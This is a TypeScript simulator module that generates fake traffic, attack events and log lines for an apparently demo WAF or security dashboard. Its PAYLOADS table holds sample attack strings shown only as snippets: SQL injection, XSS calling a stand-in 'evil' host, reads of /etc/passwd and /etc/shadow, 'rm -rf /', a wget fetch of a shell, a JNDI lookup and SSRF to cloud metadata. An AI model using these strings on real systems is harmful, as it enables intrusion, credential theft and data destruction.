import { bus } from "./eventBus";
import { nid } from "@/lib/id";
import type { AttackType, Severity, LogLevel } from "@/lib/types";
import { formatTime } from "@/lib/format";

const ATTACK_TYPES: AttackType[] = [
  "SQL Injection", "XSS", "Path Traversal", "Command Injection",
  "Brute Force", "SSRF", "RCE", "CSRF", "LFI", "Open Redirect",
];

const SEVERITIES: Severity[] = ["Critical", "High", "Medium", "Low"];
const SEVERITY_WEIGHTS = [0.08, 0.22, 0.4, 0.3];

const ENDPOINTS = [
  "/api/auth/login", "/api/users", "/api/admin/config", "/api/files/upload",
  "/api/search", "/api/payment/process", "/api/webhook", "/api/export",
  "/graphql", "/api/v2/data",
];

const METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH"] as const;
const METHOD_WEIGHTS = [0.35, 0.35, 0.12, 0.08, 0.1];

const COUNTRIES = [
  { country: "CN", city: "Beijing" }, { country: "RU", city: "Moscow" },
  { country: "US", city: "New York" }, { country: "KP", city: "Pyongyang" },
  { country: "IR", city: "Tehran" }, { country: "BR", city: "São Paulo" },
  { country: "ID", city: "Jakarta" }, { country: "NG", city: "Lagos" },
];

const LOG_SOURCES = ["edge", "api", "engine", "waf", "auth", "db"];

const PAYLOADS: Record<AttackType, string[]> = {
  "SQL Injection": ["' OR 1=1 --", "'; DROP TABLE users; --", "UNION SELECT * FROM credentials"],
  "XSS": ["<script>alert(1)</script>", "<img onerror=fetch('//evil')>", "javascript:void(0)"],
  "Path Traversal": ["../../etc/passwd", "..\\windows\\system32", "%2e%2e%2f%2e%2e%2f"],
  "Command Injection": ["; rm -rf /", "| cat /etc/shadow", "&& wget http://evil/shell"],
  "Brute Force": ["admin:password123", "root:toor", "user:123456"],
  "SSRF": ["http://169.254.169.254/meta", "file:///etc/passwd", "http://localhost:6379"],
  "RCE": ["${jndi:ldap://evil}", "__import__('os').system('id')", "eval(Buffer.from('...'))"],
  "CSRF": ["<form action='/transfer' method=POST>", "fetch('/api/delete',{method:'POST'})", "<img src='/api/admin/reset'>"],
  "LFI": ["php://filter/convert.base64", "/proc/self/environ", "....//....//etc/passwd"],
  "Open Redirect": ["//evil.com", "/redirect?url=http://phish", "/%0d%0aLocation:evil.com"],
};

function weighted<T>(items: T[], weights: number[]): T {
  const r = Math.random();
  let sum = 0;
  for (let i = 0; i < items.length; i++) {
    sum += weights[i];
    if (r <= sum) return items[i];
  }
  return items[items.length - 1];
}

function randomIp(): string {
  return `${randInt(1, 223)}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`;
}

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

let intervalId: ReturnType<typeof setInterval> | null = null;
let tickCount = 0;

function tick() {
  const now = Date.now();
  tickCount++;

  // Traffic tick
  const baseNormal = randInt(80, 200);
  const spike = tickCount % 15 === 0 ? randInt(50, 150) : 0;
  const normal = baseNormal + spike;
  const attackTraffic = randInt(2, 20);

  bus.emit("traffic-tick", {
    time: formatTime(now),
    ts: now,
    normal,
    attack: attackTraffic,
  });

  // Maybe generate attack (Poisson-like: ~30% chance per tick)
  const attackChance = 0.3 + (spike > 0 ? 0.3 : 0);
  if (Math.random() < attackChance) {
    const type = pick(ATTACK_TYPES);
    const severity = weighted(SEVERITIES, SEVERITY_WEIGHTS);
    const geo = pick(COUNTRIES);
    const attack = {
      id: nid("atk"),
      type,
      severity,
      sourceIp: randomIp(),
      geo,
      targetEndpoint: pick(ENDPOINTS),
      method: weighted([...METHODS], [...METHOD_WEIGHTS]),
      payloadSnippet: pick(PAYLOADS[type]),
      timestamp: now,
      matchedRuleId: `WAF-${type.replace(/\s/g, "").slice(0, 3).toUpperCase()}-001`,
    };
    bus.emit("attack", attack);

    // Log about the attack
    bus.emit("log", {
      id: nid("log"),
      ts: now,
      level: severity === "Critical" ? "error" : severity === "High" ? "warn" : "info",
      source: "waf",
      msg: `[${severity}] ${type} detected from ${attack.sourceIp} → ${attack.targetEndpoint}`,
      attackId: attack.id,
    });
  }

  // Random log lines
  if (Math.random() < 0.6) {
    const levels: LogLevel[] = ["info", "info", "info", "debug", "warn"];
    const msgs = [
      "Health check passed",
      "Request processed successfully",
      "Cache miss, fetching from origin",
      "Connection pool at 72% capacity",
      "SSL certificate renewal scheduled",
      "Rate limit threshold approaching",
      "Upstream latency spike detected",
      "New session established",
      "Garbage collection completed",
      "Config reload triggered",
    ];
    bus.emit("log", {
      id: nid("log"),
      ts: now + randInt(0, 500),
      level: pick(levels),
      source: pick(LOG_SOURCES),
      msg: pick(msgs),
    });
  }
}

export function startSimulator(intervalMs = 2000) {
  if (intervalId) return;
  tick(); // first tick immediately
  intervalId = setInterval(tick, intervalMs);
}

export function stopSimulator() {
  if (intervalId) {
    clearInterval(intervalId);
    intervalId = null;
  }
}
